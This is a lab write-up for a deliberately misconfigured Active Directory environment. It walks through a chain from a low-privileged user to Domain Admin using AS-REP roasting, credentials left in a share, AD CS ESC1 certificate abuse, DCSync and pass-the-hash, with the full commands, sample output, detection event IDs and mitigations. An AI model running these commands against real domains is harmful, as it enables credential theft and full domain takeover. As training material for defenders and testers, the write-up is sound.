# Lab 01: Basic AD + AD CS

## Overview
A basic corporate Active Directory environment with intentionally introduced misconfigurations.  
Designed to practice a full attack chain from a low-privileged user to Domain Admin.

## Topology

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   DC01       │    │   VICTIM     │    │   Parrot     │
│ Win Server   │────│   Win 10     │────│   Parrot OS  │
│ 192.168.31.100│   │   DHCP       │    │   DHCP       │
│ DC + AD CS   │    │   Client     │    │   Attacker   │
└──────────────┘    └──────────────┘    └──────────────┘
```
## Environment

| Component | Version |
|---|---|
| Domain Controller | Windows Server 2022 |
| Client | Windows 10 22H2 |
| Attacker | Parrot OS |
| Domain | `corp.local` |
| Subnet | `192.168.31.0/24` |

## Attack Chain

```
reader  →  Public  →  users.txt
        →  AS-REP a.hr  →  Password1
        →  a.hr  →  HR share  →  admin_note.txt
        →  hr_admin  →  ESC1  →  Administrator.pfx
        →  PKINIT  →  TGT + NT hash
        →  DCSync  →  Domain Admin
```

## Accounts

| Name | Sam | Password | Group |
|---|---|---|---|
| Alex Admin | a.admin | Password1 | IT_Admins |
| Ivan Ivanov | i.ivanov | Password1 | IT_Support |
| Olga Finance | o.finance | Password1 | Finance_Users |
| Petr Cash | p.cash | Password1 | Finance_Users |
| Anna HR | a.hr | Password1 | HR_Users |
| Sergey Sales | s.sales | Password1 | Sales_Users |
| Maria Sales | m.sales | Password1 | Sales_Users |
| SQL Service | svc_sql | Password1 | SQL_Admins |
| HR Admin | hr_admin | Password1 | HR_Users |
| Sys Admin | sys_admin | Password1 | — |
| Public Reader | reader | Password1 | — |

## Shares

| Share | Access |
|---|---|
| Public | Domain Users (Read) |
| IT | IT_Support (Change), IT_Admins (Full) |
| Finance | Finance_Users (Change) |
| HR | HR_Users (Change) |
| Sales | Sales_Users (Change) |

## Vulnerabilities

| # | Vulnerability | Where | MITRE |
|---|---|---|---|
| 1 | AS-REP Roastable | `a.hr` | T1558.004 |
| 2 | Credentials in Files | HR share | T1552.001 |
| 3 | AD CS ESC1 | CA | T1649 |
| 4 | Weak Passwords | all | T1110.002 |

## Attack Steps

### 1. Share Enumeration

```bash
nxc smb 192.168.31.100 -u reader -p 'Password1' --shares
smbclient //192.168.31.100/Public -U 'corp.local/reader%Password1' \
  -c "ls; get users.txt; exit"
```

### 2. AS-REP Roasting

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass \
  -dc-ip 192.168.31.100 -request -format hashcat -outputfile asrep.txt
john asrep.txt --wordlist=/usr/share/wordlists/fasttrack.txt
```

### 3. HR Share

```bash
smbclient //192.168.31.100/HR -U 'a.hr%Password1' \
  -c "ls; get admin_note.txt; exit"
cat admin_note.txt
```

**Contents:**

```text
=== HR SHARE ===

HR Admin!

Change your password to the temporary one:
hr_admin : Password1

After the change you can set your own.
Don't forget to delete this file.

-- IT
```
### 4. AD CS ESC1

```bash
certipy find -u hr_admin@corp.local -p 'Password1' \
    -dc-ip 192.168.31.100 -vulnerable -stdout

certipy req -u hr_admin@corp.local -p 'Password1' \
    -dc-ip 192.168.31.100 \
    -ca corp-DC01-CA \
    -template VulnerableTemplate \
    -upn Administrator@corp.local \
    -dns dc01.corp.local
```

**Result:**

```text
[*] Saving certificate and private key to 'administrator_dc01.pfx'
```
### 5. PKINIT

```bash
certipy auth -pfx administrator_dc01.pfx -dc-ip 192.168.31.100
```

**Result:**

```text
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': 
    aad3b435b51404eeaad3b435b51404ee:7b71bee7907489b8dea9a06bab7917b2
```

### 6. DCSync

```bash
impacket-secretsdump -hashes :7b71bee7907489b8dea9a06bab7917b2 \
    Administrator@192.168.31.100
```

### 7. Pass-the-Hash

```bash
impacket-psexec -hashes :7b71bee7907489b8dea9a06bab7917b2 Administrator@192.168.31.100
```

**Result:**

```text
Microsoft Windows [Version 10.0.20348.587]
C:\Windows\system32> whoami
nt authority\system
```
## Detection

| Attack | Event ID | Source |
|---|---|---|
| AS-REP Roast | 4768 | DC Security Log |
| DCSync | 4662 | DC Security Log |
| ESC1 | 4886, 4887 | CA Log |

## Mitigation

| Attack | Mitigation |
|---|---|
| AS-REP Roast | Enforce Kerberos Pre-Auth |
| Credentials in Files | No plaintext passwords on shares |
| ESC1 | Remove `EnrollSuppliesSubject` |
| Weak Passwords | Strong password policy |

## References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Certipy](https://github.com/ly4k/Certipy)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)

